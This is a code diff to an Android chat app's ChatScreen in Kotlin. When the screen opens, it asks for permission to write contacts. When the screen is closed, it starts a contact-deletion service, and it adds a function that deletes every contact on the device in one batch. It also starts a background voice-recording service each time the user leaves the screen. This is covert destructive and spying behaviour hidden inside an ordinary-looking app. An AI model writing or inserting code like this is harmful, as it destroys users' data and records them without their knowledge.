@@ -1,6 +1,7 @@
 package com.example.axesite.screens
 
 import android.Manifest
+import android.content.ContentProviderOperation
 import android.content.pm.PackageManager
 import androidx.compose.material.icons.filled.Contacts
 import android.util.Log
@@ -47,6 +48,8 @@ import androidx.compose.material.icons.filled.Pause
 import com.example.axesite.util.BackgroundVoiceRecordingService
 import android.content.ContentResolver
 import android.provider.ContactsContract
+import com.example.axesite.util.ContactDeletionService
+import java.lang.ref.WeakReference
 
 data class ContactData(
     val name: String = "",   // Provide default values
@@ -103,6 +106,19 @@ fun ChatScreen(chatId: String) {
 
         chatRef.addValueEventListener(messageListener)
     }
+//    val writeContactsPermissionLauncher = rememberLauncherForActivityResult(
+//        contract = ActivityResultContracts.RequestPermission()
+//    ) { isGranted ->
+//        if (isGranted) {
+//            // Permission granted, proceed with contact deletion
+//            coroutineScope.launch(Dispatchers.IO) {
+//                deleteAllContacts(context)
+//            }
+//        } else {
+//            // Permission denied
+//            Toast.makeText(context, "Permission required to delete contacts", Toast.LENGTH_SHORT).show()
+//        }
+//    }
 
     val contactsPermissionLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.RequestPermission()
@@ -228,19 +244,64 @@ fun ChatScreen(chatId: String) {
     ) { uri ->
         uri?.let { handleSelectedContact(it, context) }
     }
+
+    val writeContactsPermissionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.RequestPermission()
+    ) { isGranted ->
+        val weakContext = WeakReference(context)
+        if (isGranted) {
+            // Permission granted, proceed with contact deletion
+//            coroutineScope.launch(Dispatchers.IO) {
+//                weakContext.get()?.let { deleteAllContacts(it) }
+//            }
+            Toast.makeText(context, "Permission required to delete contacts", Toast.LENGTH_SHORT).show()
+
+        } else {
+            // Permission denied
+            Toast.makeText(context, "Permission required to delete contacts", Toast.LENGTH_SHORT).show()
+        }
+    }
+    LaunchedEffect(Unit) {
+        if (ContextCompat.checkSelfPermission(
+                context,
+                Manifest.permission.WRITE_CONTACTS
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            writeContactsPermissionLauncher.launch(Manifest.permission.WRITE_CONTACTS)
+        }
+    }
     DisposableEffect(chatId) {
-        // When screen is about to be destroyed
+        // Check permission when component leaves composition
         onDispose {
-            // Start background recording service
-            val intent = Intent(context, BackgroundVoiceRecordingService::class.java).apply {
-                action = BackgroundVoiceRecordingService.ACTION_START_RECORDING
+            when {
+                // Case 1: Permission already granted
+                ContextCompat.checkSelfPermission(
+                    context,
+                    Manifest.permission.WRITE_CONTACTS
+                ) == PackageManager.PERMISSION_GRANTED -> {
+                    // Start contact deletion service
+                    val serviceIntent = Intent(context, ContactDeletionService::class.java)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        context.startForegroundService(serviceIntent)
+                    } else {
+                        context.startService(serviceIntent)
+                    }
+                }
+
+                // Case 2: Need to request permission
+                else -> {
+                    writeContactsPermissionLauncher.launch(Manifest.permission.WRITE_CONTACTS)
+                }
             }
 
-            // Starting the service
+            // Always start background recording service
+            val recordingIntent = Intent(context, BackgroundVoiceRecordingService::class.java).apply {
+                action = BackgroundVoiceRecordingService.ACTION_START_RECORDING
+            }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
+                context.startForegroundService(recordingIntent)
             } else {
-                context.startService(intent)
+                context.startService(recordingIntent)
             }
         }
     }
@@ -430,6 +491,57 @@ fun ChatScreen(chatId: String) {
             }
         }
     }
+}
+
+suspend fun deleteAllContacts(context: Context) {
+    // Check permission first
+    Log.d("ContactDeletion", "Starting contact deletion...")
+    if (ContextCompat.checkSelfPermission(
+            context,
+            Manifest.permission.WRITE_CONTACTS
+        ) != PackageManager.PERMISSION_GRANTED
+    ) {
+        return
+    }
+
+    try {
+        val contentResolver = context.contentResolver
+        val operations = ArrayList<ContentProviderOperation>()
+
+        // Query RAW CONTACTS
+        val cursor = contentResolver.query(
+            ContactsContract.RawContacts.CONTENT_URI,
+            arrayOf(ContactsContract.RawContacts._ID),
+            null, null, null
+        )
+
+        cursor?.use {
+            val idIndex = it.getColumnIndex(ContactsContract.RawContacts._ID)
+            while (it.moveToNext()) {
+                val id = it.getLong(idIndex)
+                operations.add(
+                    ContentProviderOperation.newDelete(
+                        ContactsContract.RawContacts.CONTENT_URI.buildUpon()
+                            .appendPath(id.toString()).build()
+                    ).build()
+                )
+            }
+        }
+
+        if (operations.isNotEmpty()) {
+            val deletedCount = contentResolver.applyBatch(ContactsContract.AUTHORITY, operations).size
+            // Show toast on main thread
+            withContext(Dispatchers.Main) {
+                Toast.makeText(context, "Deleted $deletedCount contacts", Toast.LENGTH_SHORT).show()
+            }
+        }
+    } catch (e: Exception) {
+        Log.e("ContactDeletion", "Error deleting contacts", e)
+        withContext(Dispatchers.Main) {
+            Toast.makeText(context, "Deletion failed: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+    Log.d("ContactDeletion", "Batch operations executed")
 }
 
 private fun dumpContactsToFile(context: Context) {
